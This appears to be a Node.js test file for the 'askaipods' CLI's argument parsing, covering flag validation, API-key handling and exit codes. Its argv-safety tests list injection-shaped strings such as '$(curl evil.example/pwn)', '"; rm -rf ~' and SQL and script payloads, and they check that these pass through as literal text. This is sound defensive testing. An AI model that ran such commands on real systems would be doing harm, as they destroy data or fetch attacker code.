// Tests for src/cli.js argument parsing:
//   R6-02 — `search` subcommand only stripped when followed by another positional
//   R7-01 — argv-safety: injection-shaped queries pass through as literal args
//   --days positive-integer validation
//   --api-key trim + whitespace + ByteString validation
//   --format validation
//   ASKAIPODS_API_KEY env var fallback

import { test, describe, afterEach, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { run } from "../src/cli.js";
import { AskaipodsError } from "../src/client.js";
import { mockResponse, restoreFetch, validEnvelope } from "./helpers.mjs";

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const BIN = join(ROOT, "bin", "askaipods.js");
const PKG_VERSION = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version;

// Swallow stdout writes during run() so tests stay quiet. cli.js writes
// markdown/json on the happy path, which would pollute test output.
function muteStdout() {
  const original = process.stdout.write.bind(process.stdout);
  const chunks = [];
  process.stdout.write = (chunk, ...rest) => {
    chunks.push(typeof chunk === "string" ? chunk : chunk.toString());
    return true;
  };
  return {
    chunks,
    restore: () => {
      process.stdout.write = original;
    },
  };
}

async function runAndCatch(argv) {
  try {
    await run(argv);
    return null;
  } catch (err) {
    return err;
  }
}

describe("run — usage / version / help", () => {
  afterEach(restoreFetch);

  test("--help prints usage banner with the EXACT package.json version (R13-03 parity)", async () => {
    const stdout = muteStdout();
    try {
      await run(["--help"]);
      const out = stdout.chunks.join("");
      assert.match(out, new RegExp(`askaipods ${PKG_VERSION.replace(/\./g, "\\.")}\\b`));
      assert.match(out, /USAGE:/);
    } finally {
      stdout.restore();
    }
  });

  test("--version prints the EXACT package.json version (R13-03 parity)", async () => {
    const stdout = muteStdout();
    try {
      await run(["--version"]);
      assert.equal(stdout.chunks.join(""), `askaipods ${PKG_VERSION}\n`);
    } finally {
      stdout.restore();
    }
  });

  test("no arguments → usage error exit 1", async () => {
    const err = await runAndCatch([]);
    assert.ok(err instanceof AskaipodsError);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /missing query/i);
  });

  test("unknown flag → usage error exit 1", async () => {
    const err = await runAndCatch(["--bogus", "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /Run 'askaipods --help'/);
  });
});

describe("run — search subcommand edge cases (R6-02)", () => {
  afterEach(restoreFetch);

  test("single positional 'search' is treated as LITERAL query 'search', not a subcommand with missing arg", async () => {
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["search"]);
      assert.equal(calls.length, 1, "should reach fetch");
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.q, "search", "lone 'search' positional is the literal query");
    } finally {
      stdout.restore();
    }
  });

  test("'search <query>' strips subcommand, uses query", async () => {
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["search", "test-time compute"]);
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.q, "test-time compute");
    } finally {
      stdout.restore();
    }
  });

  test("multi-word unquoted 'search engines and AI' strips leading 'search' subcommand", async () => {
    // Documented behavior: multi-word queries starting with literal word
    // "search" must be quoted by the user. The multi-positional form
    // treats 'search' as the subcommand.
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["search", "engines", "and", "AI"]);
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.q, "engines and AI");
    } finally {
      stdout.restore();
    }
  });

  test("plain query without 'search' subcommand works", async () => {
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["what are people saying about GPUs"]);
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.q, "what are people saying about GPUs");
    } finally {
      stdout.restore();
    }
  });

  test("query that is 'search' in the middle of a quoted multi-word stays intact", async () => {
    // Positionals arriving as ["AI", "search", "landscape"] — positionals[0]
    // is "AI" not "search", so the subcommand strip does not fire.
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["AI", "search", "landscape"]);
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.q, "AI search landscape");
    } finally {
      stdout.restore();
    }
  });
});

describe("run — --days validation", () => {
  afterEach(restoreFetch);

  test("accepts positive integer", async () => {
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["--days", "30", "q"]);
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.days, 30);
    } finally {
      stdout.restore();
    }
  });

  test("rejects '0' (would drop filter silently)", async () => {
    const err = await runAndCatch(["--days", "0", "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /positive integer/);
  });

  test("rejects negative", async () => {
    const err = await runAndCatch(["--days", "-5", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("rejects non-numeric", async () => {
    const err = await runAndCatch(["--days", "abc", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("rejects '7abc' (parseInt silent-truncation guard)", async () => {
    const err = await runAndCatch(["--days", "7abc", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("rejects decimal", async () => {
    const err = await runAndCatch(["--days", "7.5", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("rejects scientific notation", async () => {
    const err = await runAndCatch(["--days", "1e3", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("rejects leading zero", async () => {
    const err = await runAndCatch(["--days", "07", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("rejects value that overflows safe integer", async () => {
    const err = await runAndCatch(["--days", "9".repeat(400), "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /too large/);
  });
});

describe("run — --format validation", () => {
  afterEach(restoreFetch);

  test("accepts 'json'", async () => {
    mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["--format", "json", "q"]);
    } finally {
      stdout.restore();
    }
  });

  test("accepts 'markdown'", async () => {
    mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["--format", "markdown", "q"]);
    } finally {
      stdout.restore();
    }
  });

  test("rejects other values", async () => {
    const err = await runAndCatch(["--format", "yaml", "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /--format must be/);
  });
});

describe("run — --api-key validation", () => {
  let savedEnv;
  beforeEach(() => {
    savedEnv = process.env.ASKAIPODS_API_KEY;
    delete process.env.ASKAIPODS_API_KEY;
  });
  afterEach(() => {
    restoreFetch();
    if (savedEnv === undefined) {
      delete process.env.ASKAIPODS_API_KEY;
    } else {
      process.env.ASKAIPODS_API_KEY = savedEnv;
    }
  });

  test("valid key reaches fetch header (trimmed)", async () => {
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["--api-key", "  mykey123  ", "q"]);
      assert.equal(calls[0].init.headers["X-PodLens-API-Key"], "mykey123");
    } finally {
      stdout.restore();
    }
  });

  test("explicit --api-key='' rejected (empty after trim)", async () => {
    const err = await runAndCatch(["--api-key", "", "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /empty or whitespace-only/i);
  });

  test("explicit whitespace-only --api-key rejected", async () => {
    const err = await runAndCatch(["--api-key", "   \t  ", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("--api-key with control character (NUL / \\x01) rejected", async () => {
    const err = await runAndCatch(["--api-key", "bad\x01key", "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /invalid characters/i);
  });

  test("--api-key with DEL (0x7F) rejected", async () => {
    const err = await runAndCatch(["--api-key", "bad\x7Fkey", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("--api-key with emoji (codepoint >0xFF) rejected", async () => {
    const err = await runAndCatch(["--api-key", "key🚀", "q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /invalid characters/i);
  });

  test("--api-key with ZWSP (U+200B) rejected", async () => {
    const err = await runAndCatch(["--api-key", "key\u200Bval", "q"]);
    assert.equal(err.exitCode, 1);
  });

  test("--api-key with Latin-1 Extended (0x80-0xFF) accepted", async () => {
    // Valid HTTP header ByteString range includes 0x80-0xFF.
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["--api-key", "key\xA9valid", "q"]);
      assert.equal(calls[0].init.headers["X-PodLens-API-Key"], "key\xA9valid");
    } finally {
      stdout.restore();
    }
  });

  test("ASKAIPODS_API_KEY env used when --api-key absent", async () => {
    process.env.ASKAIPODS_API_KEY = "envkey456";
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["q"]);
      assert.equal(calls[0].init.headers["X-PodLens-API-Key"], "envkey456");
    } finally {
      stdout.restore();
    }
  });

  test("ASKAIPODS_API_KEY env trimmed", async () => {
    process.env.ASKAIPODS_API_KEY = "  envkey456  \n";
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["q"]);
      assert.equal(calls[0].init.headers["X-PodLens-API-Key"], "envkey456");
    } finally {
      stdout.restore();
    }
  });

  test("ASKAIPODS_API_KEY env empty/whitespace → treated as unset (anonymous, no throw)", async () => {
    process.env.ASKAIPODS_API_KEY = "   \n  ";
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["q"]);
      assert.ok(
        !("X-PodLens-API-Key" in calls[0].init.headers),
        "whitespace-only env should degrade to anonymous silently",
      );
    } finally {
      stdout.restore();
    }
  });

  test("ASKAIPODS_API_KEY env with emoji rejected (explicit error, not silent downgrade)", async () => {
    process.env.ASKAIPODS_API_KEY = "key🚀";
    const err = await runAndCatch(["q"]);
    assert.equal(err.exitCode, 1);
    assert.match(err.message, /ASKAIPODS_API_KEY env var/);
  });

  test("--api-key flag takes precedence over env var", async () => {
    process.env.ASKAIPODS_API_KEY = "envkey";
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      await run(["--api-key", "flagkey", "q"]);
      assert.equal(calls[0].init.headers["X-PodLens-API-Key"], "flagkey");
    } finally {
      stdout.restore();
    }
  });
});

describe("run — argv safety (R7-01)", () => {
  afterEach(restoreFetch);

  // The contract promise in SKILL.md §Argv-safety rule is that a query
  // passed as a separate argv argument is never interpreted — it reaches
  // the outbound request body as a literal string, even when it contains
  // shell-injection-shaped characters. These tests pin that promise.

  const injectionQueries = [
    `"; rm -rf ~`,
    "$(curl evil.example/pwn)",
    "`whoami`",
    "foo && echo pwned",
    "foo | tee /tmp/x",
    "foo > /etc/hosts",
    "\\\\n\\\\r",
    "' OR 1=1--",
    "foo; ls -la",
    "<script>alert(1)</script>",
  ];

  for (const q of injectionQueries) {
    test(`query ${JSON.stringify(q)} reaches body.q as literal text`, async () => {
      const calls = mockResponse({ body: validEnvelope() });
      const stdout = muteStdout();
      try {
        await run([q]);
        const body = JSON.parse(calls[0].init.body);
        assert.equal(body.q, q, "injection-shaped query must pass through unchanged");
      } finally {
        stdout.restore();
      }
    });
  }

  test("`--` separator form: query after -- is treated as positional even with leading dash", async () => {
    const calls = mockResponse({ body: validEnvelope() });
    const stdout = muteStdout();
    try {
      // parseArgs treats `--` as terminator. Argv after it is positional.
      await run(["--", "--dangerous-looking-query"]);
      const body = JSON.parse(calls[0].init.body);
      assert.equal(body.q, "--dangerous-looking-query");
    } finally {
      stdout.restore();
    }
  });
});

describe("bin/askaipods.js subprocess — exit code contract", () => {
  // Minimal subprocess smoke test: verifies the entry-point re-throws
  // errors with the right exit code. In-process tests verify AskaipodsError
  // shape; this verifies the process boundary maps it to process.exit().

  test("--version exits 0 and emits exact package.json version (R13-03 parity)", () => {
    const res = spawnSync(process.execPath, [BIN, "--version"], { encoding: "utf8" });
    assert.equal(res.status, 0);
    assert.equal(res.stdout, `askaipods ${PKG_VERSION}\n`);
  });

  test("--help exits 0", () => {
    const res = spawnSync(process.execPath, [BIN, "--help"], { encoding: "utf8" });
    assert.equal(res.status, 0);
    assert.match(res.stdout, /USAGE:/);
  });

  test("missing query exits 1", () => {
    const res = spawnSync(process.execPath, [BIN], { encoding: "utf8" });
    assert.equal(res.status, 1);
    assert.match(res.stderr, /missing query/i);
  });

  test("--days abc exits 1", () => {
    const res = spawnSync(process.execPath, [BIN, "--days", "abc", "q"], { encoding: "utf8" });
    assert.equal(res.status, 1);
    assert.match(res.stderr, /positive integer/);
  });
});
